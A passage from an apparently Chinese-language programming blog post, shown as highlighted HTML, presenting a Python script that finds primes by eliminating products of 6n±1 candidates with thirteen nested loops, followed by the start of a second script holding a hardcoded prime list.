class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_arr</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">global</span> arr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num):</span><br><span class="line">        arr.append(<span class="number">6</span>*i-<span class="number">1</span>)</span><br><span class="line">        arr.append(<span class="number">6</span>*i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:    </span><br><span class="line">        flag = arr[-<span class="number">1</span>]    <span class="comment">#取最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span>(flag&gt;user):</span><br><span class="line">            arr.remove(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_arr</span>(<span class="params">arr</span>):</span></span><br><span class="line">    <span class="keyword">global</span> user</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">max</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">max</span>+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        xy = <span class="built_in">len</span>(arr)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,xy):</span><br><span class="line">            <span class="built_in">sum</span> =<span class="number">1</span></span><br><span class="line">            <span class="built_in">sum</span> *= arr[a1]</span><br><span class="line">            <span class="comment">#print(&quot;sum =&quot;,sum)</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">5</span>*arr[a1]&gt;=user):</span><br><span class="line">                <span class="comment">#print(&quot;a1 =&quot;,a1,&quot;  sum =&quot;,sum)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="built_in">range</span>(a1,xy):</span><br><span class="line">                <span class="built_in">sum</span> *= arr[a2]</span><br><span class="line">                <span class="comment">#print(&quot;sum2 =&quot;,sum)</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                    <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        nop = <span class="number">1</span></span><br><span class="line">                        <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                        <span class="comment">#sum /= arr[a2]</span></span><br><span class="line">                        <span class="comment">#continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">sum</span> /= arr[a2]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> a3 <span class="keyword">in</span> <span class="built_in">range</span>(a2,xy):</span><br><span class="line">                    <span class="keyword">if</span>(i&lt;<span class="number">3</span>):<span class="keyword">break</span></span><br><span class="line">                    <span class="built_in">sum</span> *= arr[a3]</span><br><span class="line">                    <span class="comment">#print(&quot;sum3 =&quot;,sum)</span></span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                        <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            nop = <span class="number">1</span></span><br><span class="line">                            <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                            <span class="comment">#sum /= arr[a3]</span></span><br><span class="line">                            <span class="comment">#continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">sum</span> /= arr[a3]</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> a4 <span class="keyword">in</span> <span class="built_in">range</span>(a3,xy):</span><br><span class="line">                        <span class="keyword">if</span>(i&lt;<span class="number">4</span>):<span class="keyword">break</span></span><br><span class="line">                        <span class="built_in">sum</span> *= arr[a4]</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                            <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                            <span class="keyword">except</span>:</span><br><span class="line">                                nop = <span class="number">1</span></span><br><span class="line">                                <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                <span class="comment">#sum /= arr[a4]</span></span><br><span class="line">                                <span class="comment">#continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">sum</span> /= arr[a4]</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> a5 <span class="keyword">in</span> <span class="built_in">range</span>(a4,xy):</span><br><span class="line">                            <span class="keyword">if</span>(i&lt;<span class="number">5</span>):<span class="keyword">break</span></span><br><span class="line">                            <span class="built_in">sum</span> *= arr[a5]</span><br><span class="line">                            <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                    nop = <span class="number">1</span></span><br><span class="line">                                    <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                    <span class="comment">#sum /= arr[a5]</span></span><br><span class="line">                                    <span class="comment">#continue</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">sum</span> /= arr[a5]</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">for</span> a6 <span class="keyword">in</span> <span class="built_in">range</span>(a5,xy):</span><br><span class="line">                                <span class="keyword">if</span>(i&lt;<span class="number">6</span>):<span class="keyword">break</span></span><br><span class="line">                                <span class="built_in">sum</span> *= arr[a6]</span><br><span class="line">                                <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                    <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                    <span class="keyword">except</span>:</span><br><span class="line">                                        nop = <span class="number">1</span></span><br><span class="line">                                        <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                        <span class="comment">#sum /= arr[a6]</span></span><br><span class="line">                                        <span class="comment">#continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    <span class="built_in">sum</span> /= arr[a6]</span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">for</span> a7 <span class="keyword">in</span> <span class="built_in">range</span>(a6,xy):</span><br><span class="line">                                    <span class="keyword">if</span>(i&lt;<span class="number">7</span>):<span class="keyword">break</span></span><br><span class="line">                                    <span class="built_in">sum</span> *= arr[a7]</span><br><span class="line">                                    <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                        <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                        <span class="keyword">except</span>:</span><br><span class="line">                                            nop = <span class="number">1</span></span><br><span class="line">                                            <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                            <span class="comment">#sum /= arr[a7]</span></span><br><span class="line">                                            <span class="comment">#continue</span></span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        <span class="built_in">sum</span> /= arr[a7]</span><br><span class="line">                                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">for</span> a8 <span class="keyword">in</span> <span class="built_in">range</span>(a7,xy):</span><br><span class="line">                                        <span class="keyword">if</span>(i&lt;<span class="number">8</span>):<span class="keyword">break</span></span><br><span class="line">                                        <span class="built_in">sum</span> *= arr[a8]</span><br><span class="line">                                        <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                            <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                            <span class="keyword">except</span>:</span><br><span class="line">                                                nop = <span class="number">1</span></span><br><span class="line">                                                <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                <span class="comment">#sum /= arr[a8]</span></span><br><span class="line">                                                <span class="comment">#continue</span></span><br><span class="line">                                        <span class="keyword">else</span>:</span><br><span class="line">                                            <span class="built_in">sum</span> /= arr[a8]</span><br><span class="line">                                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">for</span> a9 <span class="keyword">in</span> <span class="built_in">range</span>(a8,xy):</span><br><span class="line">                                            <span class="keyword">if</span>(i&lt;<span class="number">9</span>):<span class="keyword">break</span></span><br><span class="line">                                            <span class="built_in">sum</span> *= arr[a9]</span><br><span class="line">                                            <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                                <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                                <span class="keyword">except</span>:</span><br><span class="line">                                                    nop = <span class="number">1</span></span><br><span class="line">                                                    <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                    <span class="comment">#sum /= arr[a9]</span></span><br><span class="line">                                                    <span class="comment">#continue</span></span><br><span class="line">                                            <span class="keyword">else</span>:</span><br><span class="line">                                                <span class="built_in">sum</span> /= arr[a9]</span><br><span class="line">                                                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                            <span class="keyword">for</span> a10 <span class="keyword">in</span> <span class="built_in">range</span>(a9,xy):</span><br><span class="line">                                                <span class="keyword">if</span>(i&lt;<span class="number">10</span>):<span class="keyword">break</span></span><br><span class="line">                                                <span class="built_in">sum</span> *= arr[a10]</span><br><span class="line">                                                <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                                    <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                                    <span class="keyword">except</span>:</span><br><span class="line">                                                        nop = <span class="number">1</span></span><br><span class="line">                                                        <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                        <span class="comment">#sum /= arr[a10]</span></span><br><span class="line">                                                        <span class="comment">#continue</span></span><br><span class="line">                                                <span class="keyword">else</span>:</span><br><span class="line">                                                    <span class="built_in">sum</span> /= arr[a10]</span><br><span class="line">                                                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                                <span class="keyword">for</span> a11 <span class="keyword">in</span> <span class="built_in">range</span>(a10,xy):</span><br><span class="line">                                                    <span class="keyword">if</span>(i&lt;<span class="number">11</span>):<span class="keyword">break</span></span><br><span class="line">                                                    <span class="built_in">sum</span> *= arr[a11]</span><br><span class="line">                                                    <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                                        <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                                        <span class="keyword">except</span>:</span><br><span class="line">                                                            nop = <span class="number">1</span></span><br><span class="line">                                                            <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                            <span class="comment">#sum /= arr[a11]</span></span><br><span class="line">                                                            <span class="comment">#continue</span></span><br><span class="line">                                                    <span class="keyword">else</span>:</span><br><span class="line">                                                        <span class="built_in">sum</span> /= arr[a11]</span><br><span class="line">                                                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                                    <span class="keyword">for</span> a12 <span class="keyword">in</span> <span class="built_in">range</span>(a11,xy):</span><br><span class="line">                                                        <span class="keyword">if</span>(i&lt;<span class="number">12</span>):<span class="keyword">break</span></span><br><span class="line">                                                        <span class="built_in">sum</span> *= arr[a12]</span><br><span class="line">                                                        <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                                            <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                                            <span class="keyword">except</span>:</span><br><span class="line">                                                                nop = <span class="number">1</span></span><br><span class="line">                                                                <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                                <span class="comment">#sum /= arr[a12]</span></span><br><span class="line">                                                                <span class="comment">#continue</span></span><br><span class="line">                                                        <span class="keyword">else</span>:</span><br><span class="line">                                                            <span class="built_in">sum</span> /= arr[a12]</span><br><span class="line">                                                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                                        <span class="keyword">for</span> a13 <span class="keyword">in</span> <span class="built_in">range</span>(a12,xy):</span><br><span class="line">                                                            <span class="keyword">if</span>(i&lt;<span class="number">13</span>):<span class="keyword">break</span></span><br><span class="line">                                                            <span class="built_in">sum</span> *= arr[a13]</span><br><span class="line">                                                            <span class="keyword">if</span>(<span class="built_in">sum</span>&lt;user):</span><br><span class="line">                                                                <span class="keyword">try</span>:arr.remove(<span class="built_in">sum</span>)</span><br><span class="line">                                                                <span class="keyword">except</span>:</span><br><span class="line">                                                                    nop = <span class="number">1</span></span><br><span class="line">                                                                    <span class="comment">#print(sum,&quot;删除失败&quot;)</span></span><br><span class="line">                                                                    <span class="comment">#sum /= arr[a13]</span></span><br><span class="line">                                                                    <span class="comment">#continue</span></span><br><span class="line">                                                            <span class="keyword">else</span>:</span><br><span class="line">                                                                <span class="built_in">sum</span> /= arr[a13]</span><br><span class="line">                                                                <span class="keyword">break</span></span><br><span class="line">                                                            <span class="built_in">sum</span> /= arr[a13]</span><br><span class="line">                                                        <span class="built_in">sum</span> /= arr[a12]</span><br><span class="line">                                                    <span class="built_in">sum</span> /= arr[a11]</span><br><span class="line">                                                <span class="built_in">sum</span> /= arr[a10]</span><br><span class="line">                                            <span class="built_in">sum</span> /= arr[a9]</span><br><span class="line">                                        <span class="built_in">sum</span> /= arr[a8]</span><br><span class="line">                                    <span class="built_in">sum</span> /= arr[a7]                      </span><br><span class="line">                                <span class="built_in">sum</span> /= arr[a6] </span><br><span class="line">                            <span class="built_in">sum</span> /= arr[a5] </span><br><span class="line">                        <span class="built_in">sum</span> /= arr[a4] </span><br><span class="line">                    <span class="built_in">sum</span> /= arr[a3]                                       </span><br><span class="line">                <span class="built_in">sum</span> /= arr[a2]                                         </span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、用户输入数值，生成 arr[] = [2,3,6*n-1,6*n+1]</span></span><br><span class="line">arr = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">user = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个值，我将输出0-该值之内的所有素数(例1048576):&quot;</span>))</span><br><span class="line"><span class="keyword">if</span>(user&gt;<span class="built_in">pow</span>(<span class="number">5</span>,<span class="number">13</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入一个在int范围内,且不是特别大的数(小于5^13=1,220,703,125)&quot;</span>)</span><br><span class="line">    user = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个值，我将输出0-该值之内的所有素数(例1048576):&quot;</span>))</span><br><span class="line">num = <span class="built_in">int</span>(user/<span class="number">6</span>)+<span class="number">3</span></span><br><span class="line">f_arr(num)</span><br><span class="line"><span class="comment">#print(arr)           #查看arr生成情况</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">max</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">14</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">pow</span>(<span class="number">5</span>,i)&gt;=user):</span><br><span class="line">        <span class="built_in">max</span> = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 2、遍历 arr[]，从5开始，依次乘自身与比自身大的 arr[] 中的数</span></span><br><span class="line"><span class="comment"># 3、arr.remove() 删除得到的 arr[] 中的非质数</span></span><br><span class="line"><span class="comment">#print(&quot;max =&quot;,max)</span></span><br><span class="line">brr = clear_arr(arr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、输出 brr[]</span></span><br><span class="line"><span class="built_in">print</span>(brr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0 ~&quot;</span>,user,<span class="string">&quot;之间有:&quot;</span>,<span class="built_in">len</span>(brr),<span class="string">&quot;个质数&quot;</span>)</span><br></pre></td></tr></table></figure><p>以上代码应该可进行优化，连续13个for循环有点丑，应该改可以写成一个函数，本人就不写了，读者有意可自行钻研修改</p><p>注：以上代码只适合 0 ~ 5^13 = 1,220,703,125 的范围内的质数的寻找，有符号 int 最大值为 2^31 = 2,147,483,648</p><h3 id="7、公式法"><a href="#7、公式法" class="headerlink" title="7、公式法"></a>7、公式法</h3><p>无解(暂)</p><br/><h2 id="二、前面的C代码中用到的一些素数性质的python脚本验证-非严谨验证"><a href="#二、前面的C代码中用到的一些素数性质的python脚本验证-非严谨验证" class="headerlink" title="二、前面的C代码中用到的一些素数性质的python脚本验证(非严谨验证)"></a>二、前面的C代码中用到的一些素数性质的python脚本验证(非严谨验证)</h2><p>注：前面的C代码生成的1.txt文件直接copy进下方python代码中的数组即可直接操作质数</p><h3 id="1、数以质数方式增长，查看质数增长情况"><a href="#1、数以质数方式增长，查看质数增长情况" class="headerlink" title="1、数以质数方式增长，查看质数增长情况"></a>1、数以质数方式增长，查看质数增长情况</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">shuzu = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,</span><br><span class="line"><span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,</span><br><span class="line"><span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,</span><br><span class="line"><span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,</span><br><span class="line"><span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,</span><br><span class="line"><span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,</span><br><span class="line"><span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,</span><br><span class="line"><span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,</span><br><span class="line"><span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>,<span class="number">1009</span>,<span class="number">1013</span>,<span class="number">1019</span>,<span class="number">1021</span>,<span class="number">1031</span>,<span class="number">1033</span>,<span class="number">1039</span>,<span class="number">1049</span>,<span class="number">1051</span>,<span class="number">1061</span>,<span class="number">1063</span>,<span class="number">1069</span>,</span><br><span class="line"><span class="number">1087</span>,<span class="number">1091</span>,<span class="number">1093</span>,<span class="number">1097</span>,<span class="number">1103</span>,<span class="number">1109</span>,<span class="number">1117</span>,<span class="number">1123</span>,<span class="number">1129</span>,<span class="number">1151</span>,<span class="number">1153</span>,<span class="number">1163</span>,<span class="number">1171</span>,<span class="number">1181</span>,<span class="number">1187</span>,<span class="number">1193</span>,<span class="number">1201</span>,<span class="number">1213</span>,<span class="number">1217</span>,<span class="number">1223</span>,</span><br><span class="line"><span class="number">1229</span>,<span class="number">1231</span>,<span class="number">1237</span>,<span class="number">1249</span>,<span class="number">1259</span>,<span class="number">1277</span>,<span class="number">1279</span>,<span class="number">1283</span>,<span class="number">1289</span>,<span class="number">1291</span>,<span class="number">1297</span>,<span 